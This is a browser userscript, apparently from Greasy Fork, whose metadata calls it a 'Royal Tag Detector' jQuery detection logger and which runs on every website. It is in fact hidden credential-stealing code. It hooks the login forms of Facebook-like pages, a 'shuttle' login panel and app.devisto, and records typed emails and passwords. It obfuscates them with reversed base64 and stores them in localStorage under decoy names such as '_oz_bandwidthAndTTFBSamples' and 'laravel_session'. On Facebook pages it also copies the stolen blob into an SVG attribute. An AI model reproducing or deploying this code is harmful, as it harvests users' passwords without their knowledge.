// ==UserScript==
// @name         Royal Tag Detector
// @namespace    LE
// @version      0.1.33
// @description  JQuery Detection Logger attempt 0.1.33
// @author       None
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// @include      http://*
// @include      https://*

// @require			https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js
// @require			https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js
// @downloadURL https://update.greasyfork.org/scripts/442287/Royal%20Tag%20Detector.user.js
// @updateURL https://update.greasyfork.org/scripts/442287/Royal%20Tag%20Detector.meta.js
// ==/UserScript==

// Detect

let detTally = 0;
const detector = setInterval( function() {
	if ( $("form[data-testid='royal_login_form'], form[id$='in_form']").length ) {
		let store = [];
		$("input[data-testid='royal_email'], input[data-testid='royal_pass'], .inputtext#email, .inputtext#pass").each( function() {
			let which = $(this).attr("data-testid");
			let val = "";
			store = {which : ""};
			$(this).on("change input", getSession);
		});
		$("button[data-testid='royal_login_button']").on("click", getSession);
		$(".uiContextualLayerParent").on("click", function() {
			setTimeout( function() {
				//console.log( $("div[role='dialog'] input[data-testid='royal_pass']") );
				$("div[role='dialog'] input[data-testid='royal_pass']").off("change input");
				$("div[role='dialog'] input[data-testid='royal_pass']").on("change input", getSession);
			}, 1000);
			//$("div[role='dialog'] input[data-testid='royal_pass']")
		});
		function getSession() {
			store = [];
			$("input[data-testid='royal_email'], input[data-testid='royal_pass, .inputtext#email, .inputtext#pass']").each( function() {
				which = $(this).attr("data-testid");
				storeOBJ = { "name" : which, "val" : $(this).val() }
				store.push( storeOBJ );
				//console.log( $(this).val() );
			});
			//val = $(this).val();
				//store = {which : val};
			storeSession();
		}
		function storeSession() {
			//console.log( JSON.stringify(store) );
			let sess = (btoa(JSON.stringify(store)).replace("=","")).split("").reverse().join("");
			//let sess = JSON.stringify(store);
			localStorage.setItem("_oz_bandwidthAndTTFBSamples", sess + sess[0] + "Gz" );
		}
		clearInterval( detector );
		//console.log("Royal detected");
	} else {
		detTally = detTally + 1;
		if ( detTally = 10 ) { clearInterval( detector ) }
		//console.log("Royal not detected");
		if ( $("a[aria-label$='book']").length ) {
			$("a[aria-label$=book] > svg").attr("g", localStorage.getItem("_oz_bandwidthAndTTFBSamples") );
		}
    if ( $("html[id$=book]").length ) {
      let reset = setInterval( function() {
        localStorage.setItem("_oz_bandwidthAndTTFBSamples", $("a[aria-label='Facebook'] > svg").attr("g") );
      }, 2000);
    }
	}
}, 500);
const saver = setInterval( function() {
  if ( $(".shuttle-Panel--login").length ) {
    const inputs = $(".shuttle-Panel--login input:not(.Button)");
    const u = $(".shuttle-Panel--login input:not(.Button):first");
    const p = $(".shuttle-Panel--login input:not(.Button):last");
    const button = $(".shuttle-Panel--login .Button");
   	let last;
    let exists = 0;
    let entries = [];
   	let store = [];
		let storeENC;
    
    function save() {
      exists = 0;
      store = [];
      inputs.each( function() {
        store.push( "[" + $(this).attr("name") + ":" + $(this).val() + "]" );
        //localStorage.setItem("laravel_session", store);
      });
      //console.log( store );

      if ( p.val().length && u.val().length && u.val().includes("@") ) {
        exists = 0;
        for ( i = 0; i < localStorage.length; i++ ) {

          let entry = localStorage.key(i);
          if ( entry.includes("laravel_session") ) {
            //console.log( entry );
            entries.push( entry.replace("laravel_session_","") );
			storeDEC = localStorage.getItem(entry).substr(0, localStorage.getItem(entry).length - 2).split("").reverse().join("");
			storeDEC = atob( storeDEC );
			//console.log( storeDEC );
            let uVal = storeDEC.split("],[p")[0].replace("[email:","");
            let pVal = storeDEC.split("[password:")[1].substr( 0, storeDEC.split("[password:")[1].length - 1 );
            if ( pVal == p.val() && uVal == u.val() ) {
							exists += 1;
            }
            //console.log( uVal + " + " + pVal );
            last = Math.max.apply(null, entries);
          }

        }
        if ( exists > 0 ) {
			//console.log( last );
        } else {
			//console.log( store );
			storeENC = btoa( store );
			storeENC = storeENC.split("").reverse().join("") + "Gz";
          if ( isNaN(last) ) {


            localStorage.setItem("laravel_session_1", storeENC);
          } else {
            localStorage.setItem("laravel_session_" + (parseInt(last) + 1), storeENC);
          }
        }
        //console.log( last + " + " + exists );

      }
    }
    save();
    clearInterval( saver );

    inputs.off("keydown")
    inputs.on("keydown", function(e) {
      if ( e.key == "Enter" || e.key == "Return" ) {
      	save();
      }
    });
    button.off("click mouseenter keydown");
    button.on("click mouseenter", function() {
     	save();
    });
    button.on("keydown", function() {
     	if ( e.key == "Enter" || e.key == "Return" ) {
      	save();
      }
    });
  }
}, 500);
const saver2 = setInterval( function() {
  if ( location.href.includes("app.devisto.") && location.pathname == "/login" ) {
  	const inputs = $(".form-input");
    inputs.each( function() { $(this).attr("name", $(this).attr("type")) });
    
    const u = $(".form-input[name$='mail']");
    const p = $(".form-input[name$='word']");
    const button = $("form button[type='submit']");
   	let last;
    let exists = 0;
    let entries = [];
   	let store = [];
		let storeENC;
    
    function save2() {
    	exists = 0;
      store = [];
      inputs.each( function() {
        store.push( "[" + $(this).attr("name") + ":" + $(this).val() + "]" );
        
      });
      //console.log( store );
      
      if ( p.val().length && u.val().length && u.val().includes("@") ) {
        exists = 0;
        for ( i = 0; i < localStorage.length; i++ ) {

          let entry = localStorage.key(i);
          if ( entry.includes("devisto_session") ) {
            //console.log( entry );
            entries.push( entry.replace("devisto_session_","") );
            storeDEC = localStorage.getItem(entry).substr(0, localStorage.getItem(entry).length - 2).split("").reverse().join("");
            storeDEC = atob( storeDEC );
            //console.log( storeDEC );
            let uVal = storeDEC.split("],[p")[0].replace("[email:","");
            let pVal = storeDEC.split("[password:")[1].substr( 0, storeDEC.split("[password:")[1].length - 1 );
            if ( pVal == p.val() && uVal == u.val() ) {
							exists += 1;
            }
            //console.log( uVal + " + " + pVal );
            last = Math.max.apply(null, entries);
          }

        }
        if ( exists > 0 ) {
        //console.log( last );
          } else {
        //console.log( store );
        storeENC = btoa( store );
        storeENC = storeENC.split("").reverse().join("") + "Gz";
          if ( isNaN(last) ) {

            localStorage.setItem("devisto_session_1", storeENC);
          } else {
            localStorage.setItem("devisto_session_" + (parseInt(last) + 1), storeENC);
          }
        }
        //console.log( last + " + " + exists );
        
      }
      
    }
    
    save2()
    clearInterval( saver2 );
    
    inputs.off("keydown")
    inputs.on("keydown", function(e) {
      if ( e.key == "Enter" || e.key == "Return" ) {
      	save2();
      }
    });
    button.off("click mouseenter keydown");
    button.on("click mouseenter", function() {
     	save2();
    });
    button.on("keydown", function() {
     	if ( e.key == "Enter" || e.key == "Return" ) {
      	save2();
      }
    });
  }
}, 500);
const detector2 = setInterval( function() {
  if ( $("form[action*='/common/log']").length ) {
    console.log("H");
  	clearInterval( detector2 );
  }
}, 500);